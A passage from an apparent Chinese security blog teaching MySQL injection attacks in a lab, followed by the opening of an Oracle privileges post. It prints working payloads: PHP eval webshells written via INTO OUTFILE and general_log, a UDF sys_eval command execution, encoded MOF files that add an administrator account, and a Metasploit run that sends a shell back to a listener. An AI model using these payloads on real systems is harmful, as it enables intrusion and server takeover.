Building up the query........</span></span><br><span class="line">                </span><br><span class="line">                <span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br><span class="line">                mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Error Creating your user account,  : &#x27;</span>.mysql_error());</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">              ··················</span><br></pre></td></tr></table></figure>

<p>可以看到传入的<code>username</code>、<code>password</code>、<code>re_password</code>仍均被<code>mysql_escape_string</code>进行了转义处理，但是在数据库中还是插入了<code>admin&#39;#</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-33fef276cb14df54.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/245/format/webp" alt="img"></p>
<p>这是因为当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反斜杠。</p>
<p>这时，我们用<code>admin&#39;#</code>登陆，并进行密码修改，密码修改为<code>123456</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-a7d9b6711a5b608a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/946/format/webp" alt="img"></p>
<p>执行后，查看数据库数据：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-11f6fd66afb30739.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/224/format/webp" alt="img"></p>
<p>可以看到<code>admin</code>的密码由原来的<code>123</code>修改为<code>123456</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">这是因为上面的数据库更新语句，在用户名为 <span class="string">&quot;admin&#x27;#&quot;</span> 时执行的实际是：</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>因为我们将问题数据存储到了数据库，而程序再取数据库中的数据的时候没有进行二次判断便直接带入到代码中，从而造成了二次注入。</p>
<h2 id="利用SQL注入写WebShell"><a href="#利用SQL注入写WebShell" class="headerlink" title="利用SQL注入写WebShell"></a>利用SQL注入写WebShell</h2><p>写WebShell的必要条件就是拥有读写文件的权限。这个在讲带外查询的时候已经讲到过了，让我们再来回顾一下。</p>
<p>注：写Webshell之前需要知道Web根目录的绝对路径。</p>
<blockquote>
<p>获取Web根目录路径的方式：</p>
<ul>
<li>报错显示</li>
<li>遗留文件，phpinfo()</li>
<li>漏洞爆路径</li>
<li>读取配置文件</li>
</ul>
</blockquote>
<p>查看<code>secure_file_priv</code>变量的值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
<li>当secure_file_priv为G:\，就可以读取G盘的文件。</li>
<li>当secure_file_priv为null，load_file就不能加载文件。</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/7oWsbEFl9LuvDz1.png" alt="fb1da6930b6d134621129dd36805e0ca.png"></p>
<p>若该值为NULL，则需要在mysql的配置文件（my.ini）中设置 <code>secure_file_priv = &#39;&#39;</code></p>
<p><img src="https://i.loli.net/2021/10/05/wdQE7KR9AxsjghG.png" alt="3209f789243f97414ec5928f97478fa4.png"></p>
<p>若当前数据库用户没有读写文件权限，可以使用GRANT语句授予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT FILE ON *.* TO &#x27;user&#x27;@&#x27;%&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<p>注意：在Linux系统中，MySQL只是服务用户，默认没有对Web根目录有读写权限，除非能找到Web根目录下有对其他用户写入权限的目录才能写WebShell。</p>
<h3 id="利用Union-Select写入"><a href="#利用Union-Select写入" class="headerlink" title="利用Union Select写入"></a>利用Union Select写入</h3><p>这是最常见的写入方式，<code>union</code> 跟<code>select into outfile</code>，将一句话写入<code>evil.php</code>，仅适用于联合注入。</p>
<p>具体权限要求：<code>secure_file_priv</code>支持<code>web</code>目录文件导出、数据库用户File权限、获取物理路径。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;,3 into outfile &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27; --+</span><br></pre></td></tr></table></figure>

<p>也可将一句话木马进行Hex编码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e,3 into outfile &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27; --+</span><br></pre></td></tr></table></figure>

<p>这时，服务器的WEB根目录会多出一个<code>evil.php</code>的文件</p>
<p><img src="https://i.loli.net/2021/10/05/vEIkStXAfrbBq4M.png" alt="b79e8369bd05be28c62563d03e6b1a97.png"></p>
<p>验证一句话木马能否成功执行命令</p>
<p><img src="https://i.loli.net/2021/10/05/bHgSr2EWGaUMcdt.png" alt="b942d634209c5ed1ea971f002adb0490.png"></p>
<p>有关WebShell的内容在之后会详细讲解。</p>
<h3 id="利用分隔符写入"><a href="#利用分隔符写入" class="headerlink" title="利用分隔符写入"></a>利用分隔符写入</h3><p>当MySql注入的攻击方式为盲注或报错，<code>Union select</code>写入的方式显然是利用不了的，那么可以通过分隔符写入。<code>SQLMAP</code>的 <code>--os-shell</code>命令，所采用的就是一下这种方式。</p>
<p>具体权限要求：<code>secure_file_priv</code>支持<code>web</code>目录文件导出、数据库用户<code>File</code>权限、获取物理路径。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; limit 0,1 into outfile &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27; lines terminated by 0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e --+</span><br></pre></td></tr></table></figure>

<p>同样的技巧，一共有四种形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by  	（一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by 	（一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by 	（一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by    	（一句话hex编码）#</span><br></pre></td></tr></table></figure>

<h3 id="利用Log写入"><a href="#利用Log写入" class="headerlink" title="利用Log写入"></a>利用Log写入</h3><p>新版本的<code>MySQL</code>设置了导出文件的路径，很难在获取<code>Webshell</code>过程中去修改配置文件，无法通过使用<code>select into outfile</code>来写入一句话。这时，我们可以通过修改<code>MySQL</code>的<code>log</code>文件来获取<code>Webshell</code>。</p>
<p>具体权限要求：数据库用户需具备<code>Super</code>和<code>File</code>服务器权限、获取物理路径。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;; 		#查看配置</span><br><span class="line"></span><br><span class="line">set global general_log = on;			#开启general log模式</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27;;	#设置日志目录为shell地址</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;;		#写入shell</span><br><span class="line"></span><br><span class="line">set global general_log=off;			#关闭general log模式</span><br></pre></td></tr></table></figure>

<h2 id="UDF提权执行系统命令"><a href="#UDF提权执行系统命令" class="headerlink" title="UDF提权执行系统命令"></a>UDF提权执行系统命令</h2><p><strong>什么是UDF?</strong></p>
<p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。</p>
<p><strong>如何使用UDF？</strong></p>
<ul>
<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
<li>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</li>
<li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li>
<li>拥有可以将udf.dll写入相应目录的权限。</li>
</ul>
<h3 id="上传udf动态链接库"><a href="#上传udf动态链接库" class="headerlink" title="上传udf动态链接库"></a>上传udf动态链接库</h3><p>如果是mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\plugin文件夹下才能创建自定义函数。</p>
<p><img src="https://i.loli.net/2021/10/05/3EfYS6chvKqUpOu.png" alt="babe58af0410a5eafe6deafbf1c33475.png"></p>
<p>在sqlmap中可以导入udf</p>
<p><img src="https://i.loli.net/2021/10/05/Xv9lW4RHBgMp3b8.png" alt="img"></p>
<p>可以使用WebShell管理工具导入，这里就直接手工粘贴进去了</p>
<p><img src="https://i.loli.net/2021/10/05/46NVe7cTSPitLy3.png" alt="013854ab7b29796f6a1e56e597e5d234.png"></p>
<h3 id="引用共享库文件创建存储函数"><a href="#引用共享库文件创建存储函数" class="headerlink" title="引用共享库文件创建存储函数"></a>引用共享库文件创建存储函数</h3><p>存储函数创建语法：</p>
<p><img src="https://i.loli.net/2021/10/05/jO4lG1CgpuaNfTD.png" alt="image-20200704183408625"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;lib_mysqludf_sys.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>只有两个变量，一个是function_name（函数名），我们想引入的函数是<code>sys\_eval</code>。还有一个变量是<code>shared\_library\_name</code>（共享包名称），即<code>lib_mysqludf_sys.dll</code>。</p>
<p><img src="https://i.loli.net/2021/10/05/7cfCkNzYjZ9rJ5p.png" alt="d98f562a1bba6b244b906a1082acd262.png"></p>
<p>接下来我们就可以使用我们创建的<code>sys_eval()</code>函数执行系统命令了。</p>
<p><img src="https://i.loli.net/2021/10/05/D2skxSNlTy5bzXZ.png" alt="7ec7d8ef81940a743c553ffb10b58936.png"></p>
<h2 id="MOF提权执行系统命令"><a href="#MOF提权执行系统命令" class="headerlink" title="MOF提权执行系统命令"></a>MOF提权执行系统命令</h2><h3 id="实验前准备"><a href="#实验前准备" class="headerlink" title="实验前准备"></a>实验前准备</h3><p><strong>介绍</strong></p>
<p>MOF文件是<code>mysql</code>数据库的扩展（<code>C:\WINDOWS\system32\wbem\mof</code>）叫做”托管对象格式”，其作用是每隔60s就会去监控进程创建和死亡，因为MOF文件每60s就会执行，且是系统权限，所以如果我们有权限替换原有的MOF文件，就能获得<strong>system</strong>权限。</p>
<p>执行成功写入MOF文件会出现在<code>C:\WINDOWS\system32\wbem\mof\good</code>目录下，否则出现在<code>C:\WINDOWS\system32\wbem\mof\bad</code>目录下。</p>
<p><strong>利用条件</strong></p>
<ul>
<li>Windows &lt;= 2003</li>
<li>拥有<code>mysql</code>数据库的账号，且账号有写入权限</li>
<li><code>mysql</code>在<code>C:\WINDOWS\system32\wbem\mof</code>目录有写入权限</li>
</ul>
<p><strong>实验环境</strong></p>
<ul>
<li><p>系统：Windows Server 2003 Enterprise x64 Edition</p>
</li>
<li><p>数据库：MySQL 5.1.52</p>
</li>
</ul>
<h3 id="有WebShell提权"><a href="#有WebShell提权" class="headerlink" title="有WebShell提权"></a>有WebShell提权</h3><p>新建一个user.mof文件，内容如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> namespace(<span class="meta-string">&quot;\\\\.\\root\\subscription&quot;</span>)</span></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>;</span><br><span class="line">Name = <span class="string">&quot;filtP2&quot;</span>;</span><br><span class="line">Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line"><span class="string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span></span><br><span class="line"><span class="string">&quot;And TargetInstance.Second = 5&quot;</span>;</span><br><span class="line">QueryLanguage = <span class="string">&quot;WQL&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">&quot;consPCSV2&quot;</span>;</span><br><span class="line">ScriptingEngine = <span class="string">&quot;JScript&quot;</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net user hacker Admin12345 /add\&quot;)&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>将该文件上传到目标主机中，然后执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;C:\\Wamp\\WebCode\\bWAPP_latest\\user.mof&#x27;) into dumpfile &#x27;C:\\WINDOWS\\system32\\wbem\\mof\\user.mof&#x27;;</span><br><span class="line"></span><br><span class="line">#注：这里只能用into dumpfile，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</span><br></pre></td></tr></table></figure>

<p>可以看到，成功执行了<code>net user hacker Admin12345 /add</code>命令，添加了一个hacker用户，接下来再用同样的方法执行<code>net localgroup administrators hacker /add</code>命令便可提权至管理员权限。</p>
<p><img src="https://i.loli.net/2021/10/05/Ptv2C48fLVOmpy3.png" alt="image-20211005182707344"></p>
<h3 id="无WebShell提权"><a href="#无WebShell提权" class="headerlink" title="无WebShell提权"></a>无WebShell提权</h3><h4 id="16进制写入"><a href="#16进制写入" class="headerlink" title="16进制写入"></a>16进制写入</h4><p>写一个python脚本将evil.mof文件转化为16进制，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;evil.mof&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">hex1 = binascii.hexlify(content)</span><br><span class="line"><span class="built_in">hex</span> = <span class="built_in">str</span>(hex1,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>)</span><br></pre></td></tr></table></figure>

<p>转化好之后再用sql语句写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 0x23707261676d61206e616d65737061636528225c5c5c5c2e5c5c726f6f745c5c737562736372697074696f6e22290d0a696e7374616e6365206f66205f5f4576656e7446696c74657220617320244576656e7446696c7465720d0a7b0d0a4576656e744e616d657370616365203d2022526f6f745c5c43696d7632223b0d0a4e616d65203d202266696c745032223b0d0a5175657279203d202253656c656374202a2046726f6d205f5f496e7374616e63654d6f64696669636174696f6e4576656e7420220d0a22576865726520546172676574496e7374616e636520497361205c2257696e33325f4c6f63616c54696d655c2220220d0a22416e6420546172676574496e7374616e63652e5365636f6e64203d2035223b0d0a51756572794c616e6775616765203d202257514c223b0d0a7d3b0d0a696e7374616e6365206f66204163746976655363726970744576656e74436f6e73756d65722061732024436f6e73756d65720d0a7b0d0a4e616d65203d2022636f6e735043535632223b0d0a536372697074696e67456e67696e65203d20224a536372697074223b0d0a53637269707454657874203d0d0a2276617220575348203d206e657720416374697665584f626a656374285c22575363726970742e5368656c6c5c22295c6e5753482e72756e285c226e65742e6578652075736572206576696c204162636431323334202f6164645c2229223b0d0a7d3b0d0a696e7374616e6365206f66205f5f46696c746572546f436f6e73756d657242696e64696e670d0a7b0d0a436f6e73756d6572203d2024436f6e73756d65723b0d0a46696c746572203d20244576656e7446696c7465723b0d0a7d3b into dumpfile &#x27;C:\\WINDOWS\\system32\\wbem\\mof\\user.mof&#x27;;</span><br></pre></td></tr></table></figure>



<h4 id="ASCII写入"><a href="#ASCII写入" class="headerlink" title="ASCII写入"></a>ASCII写入</h4><p>写一个python脚本将evil.mof的文件内容转化为ascii码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;evil.mof&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line">asc1 = np.frombuffer(a, dtype=np.uint8)</span><br><span class="line">asc = asc1.tolist()</span><br><span class="line"><span class="built_in">print</span>(asc)</span><br></pre></td></tr></table></figure>

<p>转化好之后再用sql语句写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select char(35, 112, 114, 97, 103, 109, 97, 32, 110, 97, 109, 101, 115, 112, 97, 99, 101, 40, 34, 92, 92, 92, 92, 46, 92, 92, 114, 111, 111, 116, 92, 92, 115, 117, 98, 115, 99, 114, 105, 112, 116, 105, 111, 110, 34, 41, 13, 10, 105, 110, 115, 116, 97, 110, 99, 101, 32, 111, 102, 32, 95, 95, 69, 118, 101, 110, 116, 70, 105, 108, 116, 101, 114, 32, 97, 115, 32, 36, 69, 118, 101, 110, 116, 70, 105, 108, 116, 101, 114, 13, 10, 123, 13, 10, 69, 118, 101, 110, 116, 78, 97, 109, 101, 115, 112, 97, 99, 101, 32, 61, 32, 34, 82, 111, 111, 116, 92, 92, 67, 105, 109, 118, 50, 34, 59, 13, 10, 78, 97, 109, 101, 32, 61, 32, 34, 102, 105, 108, 116, 80, 50, 34, 59, 13, 10, 81, 117, 101, 114, 121, 32, 61, 32, 34, 83, 101, 108, 101, 99, 116, 32, 42, 32, 70, 114, 111, 109, 32, 95, 95, 73, 110, 115, 116, 97, 110, 99, 101, 77, 111, 100, 105, 102, 105, 99, 97, 116, 105, 111, 110, 69, 118, 101, 110, 116, 32, 34, 13, 10, 34, 87, 104, 101, 114, 101, 32, 84, 97, 114, 103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101, 32, 73, 115, 97, 32, 92, 34, 87, 105, 110, 51, 50, 95, 76, 111, 99, 97, 108, 84, 105, 109, 101, 92, 34, 32, 34, 13, 10, 34, 65, 110, 100, 32, 84, 97, 114, 103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101, 46, 83, 101, 99, 111, 110, 100, 32, 61, 32, 53, 34, 59, 13, 10, 81, 117, 101, 114, 121, 76, 97, 110, 103, 117, 97, 103, 101, 32, 61, 32, 34, 87, 81, 76, 34, 59, 13, 10, 125, 59, 13, 10, 105, 110, 115, 116, 97, 110, 99, 101, 32, 111, 102, 32, 65, 99, 116, 105, 118, 101, 83, 99, 114, 105, 112, 116, 69, 118, 101, 110, 116, 67, 111, 110, 115, 117, 109, 101, 114, 32, 97, 115, 32, 36, 67, 111, 110, 115, 117, 109, 101, 114, 13, 10, 123, 13, 10, 78, 97, 109, 101, 32, 61, 32, 34, 99, 111, 110, 115, 80, 67, 83, 86, 50, 34, 59, 13, 10, 83, 99, 114, 105, 112, 116, 105, 110, 103, 69, 110, 103, 105, 110, 101, 32, 61, 32, 34, 74, 83, 99, 114, 105, 112, 116, 34, 59, 13, 10, 83, 99, 114, 105, 112, 116, 84, 101, 120, 116, 32, 61, 13, 10, 34, 118, 97, 114, 32, 87, 83, 72, 32, 61, 32, 110, 101, 119, 32, 65, 99, 116, 105, 118, 101, 88, 79, 98, 106, 101, 99, 116, 40, 92, 34, 87, 83, 99, 114, 105, 112, 116, 46, 83, 104, 101, 108, 108, 92, 34, 41, 92, 110, 87, 83, 72, 46, 114, 117, 110, 40, 92, 34, 110, 101, 116, 46, 101, 120, 101, 32, 117, 115, 101, 114, 32, 101, 118, 105, 108, 32, 65, 98, 99, 100, 49, 50, 51, 52, 32, 47, 97, 100, 100, 92, 34, 41, 34, 59, 13, 10, 125, 59, 13, 10, 105, 110, 115, 116, 97, 110, 99, 101, 32, 111, 102, 32, 95, 95, 70, 105, 108, 116, 101, 114, 84, 111, 67, 111, 110, 115, 117, 109, 101, 114, 66, 105, 110, 100, 105, 110, 103, 13, 10, 123, 13, 10, 67, 111, 110, 115, 117, 109, 101, 114, 32, 61, 32, 36, 67, 111, 110, 115, 117, 109, 101, 114, 59, 13, 10, 70, 105, 108, 116, 101, 114, 32, 61, 32, 36, 69, 118, 101, 110, 116, 70, 105, 108, 116, 101, 114, 59, 13, 10, 125, 59) into dumpfile &#x27;C:\\WINDOWS\\system32\\wbem\\mof\\user.mof&#x27;;</span><br></pre></td></tr></table></figure>



<h4 id="利用MSF自动化提权"><a href="#利用MSF自动化提权" class="headerlink" title="利用MSF自动化提权"></a>利用MSF自动化提权</h4><p>可以利用<code>msf</code>的<code>exploit/windows/mysql/mysql_mof</code>模块进行自动化提权，命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="meta">#</span><span class="bash"> mysql账号密码</span></span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line"><span class="meta">#</span><span class="bash"> 目标主机ip和端口</span></span><br><span class="line">set rhost 192.168.26.174</span><br><span class="line">set rport 3306</span><br><span class="line"><span class="meta">#</span><span class="bash"> 接收shell的ip和端口</span></span><br><span class="line">set lhost 192.168.26.129</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>返回的是system权限</p>
<p><img src="https://i.loli.net/2021/10/05/Cxykrgh2HWib3qQ.png" alt="img"></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle数据库注入攻击方式</title>
    <url>/post/ec74cb90.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Oracle数据库的基本知识"><a href="#Oracle数据库的基本知识" class="headerlink" title="Oracle数据库的基本知识"></a>Oracle数据库的基本知识</h2><h3 id="Oracle数据库介绍"><a href="#Oracle数据库介绍" class="headerlink" title="Oracle数据库介绍"></a>Oracle数据库介绍</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。</p>
<p>Oracle对于MYSQL、MSSQL来说意味着更大的数据量，更大的权限。</p>
<p>Oracle服务默认端口：1521</p>
<h3 id="Oracle权限分类"><a href="#Oracle权限分类" class="headerlink" title="Oracle权限分类"></a>Oracle权限分类</h3><p>权限是用户对一项功能的执行权力。在Oracle中，根据系统管理方式不同，将Oracle权限分为系统权限与实体权限两类。系统权限是指是否被授权用户可以连接到数据库上，在数据库中可以进行哪些系统操作。而实体权限是指用户对具体的模式实体(schema)所拥有的权限。</p>
<p>系统权限：系统规定用户使用数据库的权限。（系统权限是对用户而言)。</p>
<p>实体权限：某种权限用户对其它用户的表或视图的存取权限。（是针对表或视图而言的）。</p>
<h4 id="系统权限管理"><a href="#系统权限管理" class="headerlink" title="系统权限管理"></a>系统权限管理</h4><p>—— 系统权限分类 ——</p>
<ul>
<li>DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。</li>
<li>RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。</li>
<li>CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构。</li>
</ul>
<p>对于普通用户：授予connect, resource权限。</p>
<p>对于DBA管理用户：授予connect，resource, dba权限。</p>
<blockquote>
<p>系统权限授权命令： 系统权限只能由DBA用户授出：sys, system(最开始只能是这两个用户) 授权命令：SQL&gt; grant connect, resource, dba to 用户名1 [,用户名2]…; 注:普通用户通过授权可以具有与system相同的用户权限，但永远不能达到与sys用户相同的权限，system用户的权限也可以被回收。 例： SQL&gt; connect system/manager SQL&gt; Create user user50 identified by user50; SQL&gt; grant connect, resource to user50;</p>
<p>查询用户拥有哪里权限： SQL&gt; select * from dba_role_privs; SQL&gt; select * from dba_sys_privs; SQL&gt; select * from role_sys_privs;</p>
<p>查自己拥有哪些系统权限 SQL&gt; select * from session_privs;</p>
<p>删除用户 SQL&gt; drop user 用户名 cascade; //加上cascade则将用户连同其创建的东西全部删除</p>
<p>系统权限传递：增加WITH ADMIN OPTION选项，则得到的权限可以传递。 SQL&gt; grant connect, resorce to user50 with admin option; //可以传递所获权限。</p>
<p>系统权限回收：系统权限只能由DBA用户回收 SQL&gt; Revoke connect, resource from user50;</p>
<p>说明： 1）如果使用WITH ADMIN OPTION为某个用户授予系统权限，那么对于被这个用户授予相同权限的所有用户来说，取消该用户的系统权限并不会级联取消这些用户的相同权限。 2）系统权限无级联，即A授予B权限，B授予C权限，如果A收回B的权限，C的权限不受影响；系统权限可以跨用户回收，即A可以直接收回C用户的权限。</p>
</blockquote>
<h4 id="实体权限管理"><a href="#实体权限管理" class="headerlink" title="实体权限管理"></a>实体权限管理</h4><p>—— 实体权限分类 ——</p>
<ul>
<li>select, update, insert, alter, index, delete, all //all包括所有权限</li>
<li>execute //执行存储过程权限</li>
</ul>
<blockquote>
<p>user01: SQL&gt; grant select, update, insert on product to user02; SQL&gt; grant all on product to user02;</p>
<p>user02: SQL&gt; select * from user01.product; // 此时user02查user_tables，不包括user01.product这个表，但如果查all_tables则可以查到，因为他可以访问。</p>
<p>将表的操作权限授予全体用户： SQL&gt; grant all on product to public; // public表示是所有的用户，这里的all权限不包括drop。</p>
<p>实体权限数据字典 SQL&gt; select owner, table_name from all_tables; // 用户可以查询的表 SQL&gt; select table_name from user_tables; // 用户创建的表 SQL&gt; select grantor, table_schema, table_name, privilege from all_tab_privs; // 获权可以存取的表（被授权的） SQL&gt; select grantee, owner, table_name, privilege from user_tab_privs; // 授出权限的表(授出的权限)</p>
<p>DBA用户可以操作全体用户的任意基表(无需授权，包括删除)：</p>
<p>DBA用户： SQL&gt; Create table stud02.product( id number(10), name varchar2(20)); SQL&gt; drop table stud02.emp;</p>
<p>SQL&gt; create table stud02.employee as select * from scott.emp;</p>
<p>实体权限传递(with grant option)：</p>
<p>user01: SQL&gt; grant select, update on product to user02 with grant option; // user02得到权限，并可以传递。</p>
<p>实体权限回收：</p>
<p>user01: SQL&gt;Revoke select, update on product from user02; //传递的权限将全部丢失。</p>
<p>说明 1）如果取消某个用户的对象权限，那么对于这个用户使用WITH GRANT OPTION授予权限的用户来说，同样还会取消这些用户的相同权限，也就是说取消授权时级联的。</p>
</blockquote>
<h4 id="管理角色"><a href="#管理角色" class="headerlink" title="管理角色"></a>管理角色</h4><blockquote>
<p>建一个角色 sql&gt;create role role1;</p>
<p>授权给角色 sql&gt;grant create any table,create procedure to role1;</p>
<p>授予角色给用户 sql&gt;grant role1 to user1;</p>
<p>查看角色所包含的权限 sql&gt;select * from role_sys_privs;</p>
<p>创建带有口令以角色(在生效带有口令的角色时必须提供口令) sql&gt;create role role1 identified by password1;</p>
<p>修改角色：是否需要口令 sql&gt;alter role role1 not identified; sql&gt;alter role role1 identified by password1;</p>
<p>设置当前用户要生效的角色 (注：角色的生效是一个什么概念呢？假设用户a有b1,b2,b3三个角色，那么如果b1未生效，则b1所包含的权限对于a来讲是不拥有的，只有角色生效了，角色内的权限才作用于用户，最大可生效角色数由参数MAX_ENABLED_ROLES设定；在用户登录后，oracle将所有直接赋给用户的权限和用户默认角色中的权限赋给用户。） sql&gt;set role role1; //使role1生效 sql&gt;set role role,role2; //使role1,role2生效 sql&gt;set role role1 identified by password1; //使用带有口令的role1生效 sql&gt;set role all; //使用该用户的所有角色生效 sql&gt;set role none; //设置所有角色失效 sql&gt;set role all except role1; //除role1外的该用户的所有其它角色生效。 sql&gt;select * from SESSION_ROLES; //查看当前用户的生效的角色。</p>
<p>修改指定用户，设置其默认角色 sql&gt;alter user user1 default role role1; sql&gt;alter user user1 default role all except role1;</p>
<p>删除角色 sql&gt;drop role role1;</p>
<p>角色删除后，原来拥用该角色的用户就不再拥有该角色了，相应的权限也就没有了。</p>
<p>说明: 1)无法使用WITH GRANT OPTION为角色授予对象权限 2)可以使用WITH ADMIN OPTION 为角色授予系统权限,取消时不是级联</p>
</blockquote>
